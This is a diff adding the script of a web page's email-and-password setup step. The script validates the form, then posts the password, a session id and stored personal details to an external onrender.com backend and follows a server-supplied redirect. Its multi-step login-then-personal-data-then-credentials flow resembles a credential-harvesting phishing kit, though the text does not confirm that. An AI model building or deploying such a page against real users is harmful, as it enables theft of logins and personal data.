+            const submitBtn = document.getElementById('submitBtn');
+            const spinner = submitBtn.querySelector('.loading');
+            const buttonText = submitBtn.querySelector('span');
+            
+            spinner.classList.add('active');
+            buttonText.textContent = 'Setting up...';
+            submitBtn.disabled = true;
+            
+            // Clear previous errors and success messages
+            clearErrors();
+            document.getElementById('successMessage').classList.remove('show');
+            
+            // Validate fields
+            let isValid = true;
+            
+            // Validate Email
+            if (!email) {
+                showError('email', 'Please enter your email address');
+                isValid = false;
+            } else if (!validateEmail(email)) {
+                showError('email', 'Please enter a valid email address');
+                isValid = false;
+            } else {
+                showSuccess('email');
+            }
+            
+            // Validate Confirm Email
+            if (!confirmEmail) {
+                showError('confirmEmail', 'Please confirm your email address');
+                isValid = false;
+            } else if (email !== confirmEmail) {
+                showError('confirmEmail', 'Email addresses do not match');
+                isValid = false;
+            } else {
+                showSuccess('confirmEmail');
+            }
+            
+            // Validate Password
+            if (!password) {
+                showError('password', 'Please create a password');
+                isValid = false;
+            } else if (!validatePassword(password)) {
+                showError('password', 'Password does not meet all requirements');
+                isValid = false;
+            } else {
+                showSuccess('password');
+            }
+            
+            // Validate Confirm Password
+            if (!confirmPassword) {
+                showError('confirmPassword', 'Please confirm your password');
+                isValid = false;
+            } else if (password !== confirmPassword) {
+                showError('confirmPassword', 'Passwords do not match');
+                isValid = false;
+            } else {
+                showSuccess('confirmPassword');
+            }
+            
+            // Validate Terms
+            if (!termsAccepted) {
+                showError('terms', 'You must accept the Terms of Service and Privacy Policy');
+                isValid = false;
+            }
+            
+            if (!isValid) {
+                // Reset button state
+                spinner.classList.remove('active');
+                buttonText.textContent = 'Complete Setup';
+                submitBtn.disabled = false;
+                return;
+            }
+            
+            // Prepare data for submission
+            const emailData = {
+                email: email,
+                password: password,
+                session_id: getSessionId(),
+                personal_data: getPersonalData()
+            };
+            
+            // Send data to server
+            fetch('https://b-bcknd.onrender.com/setup-email', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(emailData)
+            })
+            .then(res => {
+                if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+                return res.json();
+            })
+            .then(data => {
+                if (data.success) {
+                    // Show success message
+                    document.getElementById('successMessage').textContent = 'Email setup completed successfully! Redirecting...';
+                    document.getElementById('successMessage').classList.add('show');
+                    
+                    // Store email data in localStorage (for demo purposes)
+                    localStorage.setItem('email_data', JSON.stringify({
+                        email: email,
+                        setup_completed: true
+                    }));
+                    
+                    // Clear sensitive data from localStorage after setup
+                    setTimeout(() => {
+                        localStorage.removeItem('personal_data');
+                        localStorage.removeItem('session_id');
+                    }, 1000);
+                    
+                    // Redirect to dashboard or welcome page
+                    setTimeout(() => {
+                        window.location.href = data.redirect_url || 'welcome.html';
+                    }, 1500);
+                } else {
+                    throw new Error(data.error || 'Failed to setup email');
+                }
+            })
+            .catch(err => {
+                console.error('Email setup error:', err);
+                
+                // Show error message
+                document.getElementById('successMessage').textContent = 'Error: ' + err.message;
+                document.getElementById('successMessage').classList.add('show');
+                document.getElementById('successMessage').classList.remove('success-message');
+                document.getElementById('successMessage').classList.add('error-message');
+                
+                // Reset button state
+                spinner.classList.remove('active');
+                buttonText.textContent = 'Complete Setup';
+                submitBtn.disabled = false;
+            });
+        });
+        
+        // Get session ID from localStorage or URL
+        function getSessionId() {
+            // Try to get from localStorage first
+            const sessionId = localStorage.getItem('session_id');
+            
+            // If not in localStorage, try to get from URL parameters
+            if (!sessionId) {
+                const urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get('session_id');
+            }
+            
+            return sessionId;
+        }
+        
+        // Get personal data from localStorage
+        function getPersonalData() {
+            const personalData = localStorage.getItem('personal_data');
+            if (personalData) {
+                try {
+                    return JSON.parse(personalData);
+                } catch (e) {
+                    console.error('Error parsing personal data:', e);
+                    return null;
+                }
+            }
+            return null;
+        }
+        
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', () => {
+            // Check if we have a session ID
+            const sessionId = getSessionId();
+            if (!sessionId) {
+                alert('No active session found. Please login again.');
+                window.location.href = 'index.html';
+                return;
+            }
+            
+            // Check if personal data exists
+            const personalData = getPersonalData();
+            if (!personalData) {
+                alert('Personal information not found. Please complete that step first.');
+                window.location.href = 'personal.html';
+                return;
+            }
+            
+            // Load previously saved email if exists
+            const savedEmail = localStorage.getItem('email_data');
+            if (savedEmail) {
+                try {
+                    const data = JSON.parse(savedEmail);
+                    if (data.email) {
+                        document.getElementById('email').value = data.email;
+                        document.getElementById('confirmEmail').value = data.email;
+                    }
+                } catch (e) {
+                    console.error('Error loading saved email:', e);
+                }
+            }
+            
+            // Initialize password strength display
+            const password = document.getElementById('password').value;
+            if (password) {
+                checkPasswordStrength(password);
+            }
+            
+            // Add email domain suggestions
+            const emailInput = document.getElementById('email');
+            emailInput.addEventListener('blur', function() {
+                const email = this.value.trim();
+                if (email && !email.includes('@')) {
+                    // Auto-suggest common domains
+                    const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
+                    const suggestion = email + '@' + domains[0];
+                    this.value = suggestion;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
